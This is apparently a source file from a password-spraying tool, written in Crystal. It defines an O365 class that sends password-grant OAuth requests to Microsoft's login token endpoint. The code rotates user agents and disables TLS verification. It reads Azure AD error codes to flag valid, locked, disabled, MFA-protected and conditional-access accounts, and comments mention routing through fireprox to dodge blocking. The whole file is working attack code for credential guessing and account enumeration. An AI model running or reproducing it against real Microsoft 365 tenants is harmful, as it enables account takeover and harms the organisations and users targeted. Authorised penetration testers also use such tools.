require "http/client"

class O365 < Sprayer

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        # set default return values
        lockout = false
        mfa = false 
        valid = false

        
        # url = "login.microsoft.com"
        post_page = "/common/oauth2/token"

        # if @target != "login.microsoft.com" 
        #     url = @target.split("https://")[1].split("/fireprox/")[0]
        #     post_page = "/fireprox/common/oauth2/token"
        # end

        url = URI.parse "#{@target}/common/oauth2/token"

        
        # context = OpenSSL::SSL::Context::Client.insecure
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE

        bodyparams = {
            "resource" => "https://graph.windows.net",
            "client_id" => "1b730954-1685-4b74-9bfd-dac224a7b894",
            "client_info" => "1",
            "grant_type" => "password",
            "username" => username,
            "password" => password,
            "scope" => "openid"
        }


        client = HTTP::Client.new(url, tls: context)
        header = HTTP::Headers{
            # "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))],
            "Accept" => "application/json",
            "Content-Type" => "application/x-www-form-urlencoded"
        }
        # puts "Requesting Page..."
        page = nil
        while !page # after a while ocasionally a dns entry woudl go awry... not sure.... just check again and it should be fine
            begin 
                page = client.post( "#{url.path}" , headers: header, form: bodyparams )
            rescue e
                # STDERR.puts  e.message 
                STDERR.puts "ERROR: oops something happend (blame dns) Retrying..."
                sleep 2 
            end
        end
        
        # page = HTTP::Client.post( "https://#{url}/common/oauth2/token" , headers: header, form: bodyparams )
        # puts page.status_code
        # puts  page.headers
        # if page.status_code == 405 # ip is most likely blacklisted
        #     # puts "Returned a 405"
        #     return nil
        # end


        if page.body.includes? "AADSTS50056"  # Invalid or missing password: password does not exist in the directory for this user.
            STDERR.puts "#{username} Account exists but may not use office365 directly. ( federated like okta/Godaddy?? )"
        end


        if page.body.includes? "AADSTS50034"
            STDERR.puts "The user account #{username} does not exist in the #{username.split("@")[1].to_s} directory."
        end


        mfa = true if page.body.includes? "AADSTS50158" # mfa duo or other ( conditionall access )
        mfa = true if page.body.includes? "AADSTS50079" # mfa microsoft
        mfa = true if page.body.includes? "AADSTS50076" # mfa microsoft
        # mfa = true if page.status_code == 
        lockout = true if page.body.includes? "AADSTS50053" # locked out smartlock or regular 

        if page.body.includes? "AADSTS50057" 
            STDERR.puts "#{username} is Disabled"
        end
        

        # set the valid if returns 200 or if mfa also account is valid if conditional access is found 
        valid = true if mfa || page.status_code == 200 
        valid = true if page.body.includes? "AADSTS53003" 
        puts "CONDITIONAL ACCESS enabled for #{username}!!!" if page.body.includes? "AADSTS53003"  # this is in the api request 
        if page.body.includes? "ConvergedConditionalAccess" # this is in the actual web html responce of the web page 
            puts "CONDITIONAL ACCESS enabled for #{username}!!!"
            valid = true 
        end

        # puts "\t#{valid} Username: #{username}\t\tPassword: #{password} "
        return [username,password,valid,lockout,mfa]
    end
end 
